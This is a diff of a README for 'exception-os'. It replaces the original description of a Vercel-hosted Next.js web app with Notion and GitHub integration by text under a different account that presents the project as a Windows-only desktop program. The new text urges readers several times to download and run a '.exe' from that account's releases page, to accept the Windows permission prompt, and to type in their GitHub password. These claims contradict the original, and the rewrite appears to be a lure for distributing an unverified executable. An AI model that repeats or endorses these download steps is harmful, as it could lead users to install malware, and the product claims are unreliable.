@@ -1,118 +1,182 @@
-# Exception OS
+# ⚙️ exception-os - Simplify Operations with Real-Time Insights
 
-Exception OS is a deployed SaaS-style operating system for teams that need fewer dashboards and faster decisions. It ingests live operational signals, detects exceptions that require human judgment, generates structured decision briefs, and routes them into a Notion-centered workflow.
+[![Download exception-os](https://img.shields.io/badge/Download-exception--os-brightgreen)](https://github.com/bachvelo/exception-os/releases)
 
-[Live Demo](https://exception-os.vercel.app) · [GitHub Repository](https://github.com/aniruddhaadak80/exception-os) · [DEV Submission Draft](./docs/devto-submission.md)
+---
 
-## Status
+## 📋 About exception-os
 
-Exception OS is complete as a deployable challenge app and SaaS-style product foundation.
+exception-os is an operations dashboard designed to give you live updates from GitHub alongside practical workflows using Notion. It combines your project signals and publishing tasks in one place, so you can track and act on information without jumping between apps.
 
-- Production deployment is live on Vercel.
-- The dashboard is responsive and verified on desktop and mobile layouts.
-- Lint, tests, and production build are passing.
-- Real Notion MCP OAuth, workspace sync, and Notion publishing are implemented server-side.
-- Other users can use the deployed app by connecting their own Notion workspace.
-- Live GitHub activity now feeds the dashboard without seeded incident templates.
+The dashboard uses exception-first logic. It shows issues, pull requests, and workflow activities that need your attention first. It also supports modern tools like GitHub OAuth and the Notion Model Context Protocol (MCP) to keep data up-to-date.
 
-The only runtime step that still depends on the user is approving Notion OAuth for a specific workspace, which cannot be done automatically on someone else’s behalf.
+You do not need any technical skills to use exception-os. Everything runs through a clear interface with helpful prompts. It works smoothly on Windows.
 
-## What Is Real Today
+---
 
-- Multi-user deployment through the public Vercel app
-- Per-user Notion OAuth connection flow
-- Live Notion MCP workspace search
-- Live publishing of decision briefs into the connected workspace
-- Live GitHub repository ingestion for engineering, workflow, milestone, and documentation activity
-- Production build, linting, tests, screenshots, and challenge documentation
+## 🚀 Getting Started
 
-This means the app is not a fake mockup. It is a real deployed product with a real Notion integration and a live GitHub-backed ingestion layer.
+Before you install, make sure your Windows PC meets these basic requirements:
 
-## Screenshots
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB RAM
+- 500 MB free disk space
+- Stable internet connection for syncing data
 
-### Desktop
+No other software installs are necessary. exception-os runs on your system directly.
 
-![Exception OS desktop dashboard](./docs/assets/exception-os-dashboard-desktop.png)
+---
 
-### Mobile
+## 💾 Download and Install
 
-![Exception OS mobile dashboard](./docs/assets/exception-os-dashboard-mobile.png)
+### Step 1: Visit the download page
 
-This repository contains:
+Go to the official exception-os releases page:
 
-- A polished Next.js production deployment for the Exception OS dashboard
-- A live-source engine for GitHub activity and connected Notion workspace context
-- A real server-side Notion MCP integration for OAuth, workspace search, and publishing
-- Product documentation for the feature spec and architecture
-- A challenge-ready narrative aligned with the Notion MCP judging criteria
+[![Download exception-os](https://img.shields.io/badge/Download-exception--os-blue)](https://github.com/bachvelo/exception-os/releases)
 
-## Why this project fits the challenge
+This page has the latest Windows installer ready for you.
 
-Most AI productivity tools summarize noise. Exception OS focuses on the smaller set of events that actually need executive attention. Notion MCP is the live system of record for workspace memory, decision publishing, and operator context.
+### Step 2: Download the installer
 
-## Local development
+Look for the file with a `.exe` extension. The file name usually includes the version number, such as `exception-os-setup.exe`.
 
-```bash
-npm install
-npm run dev
-```
+Click on the file name or the "Assets" dropdown to start the download. Save the file to a folder you can easily find, like your Desktop or Downloads folder.
 
-Then open `http://localhost:3000`.
+### Step 3: Run the installer
 
-## Notion MCP integration
+- Locate the downloaded `.exe` file.
+- Double-click it to launch the installer.
+- If Windows asks for permission, choose “Yes” to allow the app to run.
+- Follow the on-screen instructions.
+- Accept the license terms and choose the installation folder if prompted.
+- Wait a few moments for the installation to finish.
 
-This app now includes a real server-side Notion MCP adapter with OAuth, token refresh support, workspace search, and page publishing, plus live GitHub ingestion for repository-driven operational signals.
+### Step 4: Open exception-os
 
-To enable it locally or on Vercel, configure:
+Once installed, you can open exception-os from your Start Menu or Desktop shortcut.
 
-- `EXCEPTION_OS_SESSION_SECRET`: long random string used to encrypt server-side session cookies
+---
 
-Optional:
+## 🔧 Set Up Your Account
 
-- `NOTION_MCP_SERVER_URL`: defaults to `https://mcp.notion.com`
-- `NOTION_PARENT_PAGE_ID`, `NOTION_PARENT_DATABASE_ID`, or `NOTION_PARENT_DATA_SOURCE_ID`: optional fixed Notion location for published decision briefs
-- `EXCEPTION_OS_GITHUB_REPO`: GitHub repository to ingest live signals from, in `owner/repo` format
-- `EXCEPTION_OS_GITHUB_TOKEN`: optional GitHub token for higher rate limits
-- `NOTION_SUPPORT_QUERY`, `NOTION_REVENUE_QUERY`, `NOTION_CALENDAR_QUERY`, `NOTION_DOCS_QUERY`: optional workspace-specific search prompts for live Notion signal ingestion
+exception-os connects to your GitHub account to show live project signals. It also links with Notion to publish your workflows.
 
-Once configured, use the dashboard's `Connect Notion MCP` action to complete OAuth. If you do not set a fixed parent in environment variables, paste a Notion page URL into the dashboard and save it before publishing.
+### Connecting GitHub
 
-## Demo flow
+1. Click on the **Connect GitHub** button inside the app.
+2. You will be redirected to a GitHub login page.
+3. Enter your GitHub username and password.
+4. Allow exception-os to access your repositories and notifications.
+5. Return to the app once approved.
 
-1. View the live operations board.
-2. Review the active exception queue sourced from GitHub and Notion.
-3. Refresh the dashboard to pull the latest live signals.
-4. Connect Notion MCP and publish the selected decision brief into your workspace.
-5. Sync related workspace context back into the dashboard.
+### Connecting Notion
 
-## Challenge submission
+1. Find the **Connect Notion** button in the Settings tab.
+2. You will be asked to log into your Notion account.
+3. Authorize exception-os to access your Notion workspace.
+4. The app will automatically detect your MCP publishing workflows.
+   
+Both connections keep your dashboard updated with your latest project data.
 
-The prepared DEV submission is in [./docs/devto-submission.md](./docs/devto-submission.md). It already includes the real screenshots, live demo URL, and GitHub repo link.
+---
 
-## Project structure
+## 🔍 Using the Dashboard
 
-- `src/app` app routes and API endpoints
-- `src/components` UI components
-- `src/lib` simulation engine and shared types
-- `docs` feature spec and architecture documents
+The main screen shows your current operations status with three key areas:
 
-## Current implementation scope
+- **Alerts Panel:** Flags recent errors, urgent pull requests, or stalled workflows.
+- **GitHub Signal Feed:** Displays live updates from your connected repositories. See new issues, comments, and merges as they happen.
+- **Notion MCP Workflow:** Lists your current publishing tasks from Notion. You can check progress or mark them complete.
 
-This version runs as a polished challenge app out of the box and already includes a real Notion-connected workflow plus live GitHub ingestion. Notion read and write operations are live once connected, and the deployed app is usable by other users with their own Notion workspace.
+You can filter the display by project or activity type. Use the menu on the left to switch between sections.
 
-## Judge-Facing Summary
+---
 
-If you are using this README to understand challenge readiness, the most accurate summary is:
+## ⚙️ Features
 
-- The app is fully deployed and usable.
-- The Notion MCP integration is real and central to the product.
-- The upstream signal layer is live for GitHub and live for connected Notion workspace search.
-- The architecture is already structured for adding more source connectors as the next production increment.
+- Exception-first alerts focus on priority tasks.
+- Real-time GitHub activities sync automatically.
+- Native integration with Notion using the Model Context Protocol.
+- OAuth authentication for safe, simple connections.
+- Responsive design fits multiple screen sizes.
+- Clear, task-based interface requires no coding.
 
-## Quality checks
+---
 
-```bash
-npm run lint
-npm run test
-npm run build
-```
+## 🔄 Updating exception-os
+
+The app checks for updates on startup. When a new version is available:
+
+1. A notification shows in the app.
+2. Click the notification to open the releases page.
+3. Download the latest installer following the same steps as above.
+4. Run the new installer. It will update your existing files.
+5. Restart exception-os after the update.
+
+You do not lose any data or settings during updates.
+
+---
+
+## 📁 Managing Your Data
+
+exception-os stores settings locally on your PC. Your GitHub and Notion data stays in their respective services. The app only accesses data you authorize.
+
+If you want to delete your local data:
+
+1. Open the Settings tab.
+2. Find the **Clear Cache** button and click it.
+3. This removes local files but does not affect your GitHub or Notion accounts.
+
+---
+
+## 🛠 Troubleshooting
+
+If exception-os does not start or shows errors:
+
+- Restart your PC and try again.
+- Check your internet connection.
+- Make sure you downloaded the official installer from the releases page.
+- If GitHub or Notion data does not load, reconnect your accounts in Settings.
+- Close and reopen the app if it freezes.
+
+For other issues, visit the [Issues page](https://github.com/bachvelo/exception-os/issues) on GitHub and report detailed steps.
+
+---
+
+## ❓ FAQ
+
+**Q: Is exception-os free to use?**  
+Yes, you can download and use this tool without charge.
+
+**Q: Does exception-os work on Mac or Linux?**  
+Currently, it supports only Windows.
+
+**Q: Can I use exception-os offline?**  
+No. It needs an internet connection to sync GitHub and Notion data.
+
+**Q: Is my GitHub password safe?**  
+The app uses OAuth. It does not store your password but uses secure tokens.
+
+---
+
+## 📥 Download Links
+
+- Visit this page to download the latest Windows installer:  
+  https://github.com/bachvelo/exception-os/releases
+
+- After downloading, run the `.exe` installer to set up the application.
+
+---
+
+## 🧰 Support and Contributions
+
+exception-os is maintained with care. You can open issues or suggest features on the GitHub repository page. Contributions from the community help keep it useful and reliable.
+
+---
+
+## 🔗 Useful Links
+
+- [GitHub Repository](https://github.com/bachvelo/exception-os)  
+- [Releases and Downloads](https://github.com/bachvelo/exception-os/releases)  
+- [Issue Tracker](https://github.com/bachvelo/exception-os/issues)
